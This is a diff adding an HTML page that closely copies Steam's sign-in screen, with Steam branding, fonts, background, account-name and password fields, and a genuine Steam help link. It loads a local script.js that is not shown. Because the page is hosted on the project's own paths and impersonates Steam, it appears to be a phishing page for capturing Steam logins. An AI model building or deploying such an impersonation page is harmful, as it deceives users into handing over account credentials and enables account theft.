@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="/static/images/steam.ico">
+  </head>
+  <body>
+    <main class="outer">
+      <p>Steam | Sign In</p>
+      <main class="inner">
+        <div>
+          <label class="blue">sign in with account name</label>
+          <input type="text" id="user">
+        </div>
+        <div>
+          <label>password</label>
+          <input type="password" id="pass">
+        </div>
+        <button id="submit">Sign in</button>
+        <a href="https://help.steampowered.com/en/wizard/HelpWithLogin">Help, I can't sign in</a>
+      </main> 
+    </main>
+    <script type="module" src="/static/script.js"></script>
+  </body>
+
+  <style>
+    @font-face {
+      font-family: streg;
+      src: url(/static/fonts/MotivaSans.ttf);
+    }
+
+    @font-face {
+      font-family: stmed;
+      src: url(/static/fonts/MotivaSansMedium.ttf);
+    }
+    
+    @font-face {
+      font-family: stthin;
+      src: url(/static/fonts/MotivaSansThin.ttf);
+    }
+
+    *{
+      margin: 0;
+      padding: 0;
+    }
+
+    body{
+      color: #afafaf;
+      background: url("/static/images/steam.jpg")
+    }
+
+    .outer{
+      width: 500px;
+      position: absolute;
+      z-index: auto;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+    }
+
+    .inner{
+      display: flex;
+      flex-direction: column;
+      padding: 24px 32px;
+      background: #181a21;
+      width: 450px;
+      gap: 10px;
+    }
+
+    p{
+      color: #fff;
+      font-family: streg;
+      text-transform: uppercase;
+      font-weight: 200;
+      letter-spacing: .055em;
+      font-size: 32px;
+    } 
+
+    div{
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    label{
+      font-family: streg;
+      text-transform: uppercase;
+      text-transform: uppercase;  
+      letter-spacing: .02em;
+      user-select: none;
+      font-size: 12px;
+    }
+
+    .blue{
+      color: #1999ff;
+    }
+
+    button{
+      margin-top: 10px;
+      background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
+      border-radius: 2px;
+      border: none;
+      outline: none;
+      padding: 12px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 400;
+      font-family: stmed;
+      text-align: center;
+      cursor: pointer;
+      width: 270px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    button:hover{
+      background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 120%);
+    }
+
+    input{
+      background: #32353c;
+      border: 1px solid #32353c;
+      outline: none;
+      color: #fff;
+      padding: 10px;
+      font-size: 15px;
+    }
+
+    input::selection{
+      background: #54a5d4;
+      text-shadow: 1px 1px 2px rgba(0,0,0,.6666666667);
+      color: #fff;
+    }
+
+    input:hover{
+     background: #393c44;
+    }
+
+    a{
+      font-family: streg;
+      color: #afafaf;
+      font-size: 12px;
+      text-decoration: underline;
+      cursor: pointer;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    a:hover{
+      color: #ccc;
+    }
+  </style>
+</html>
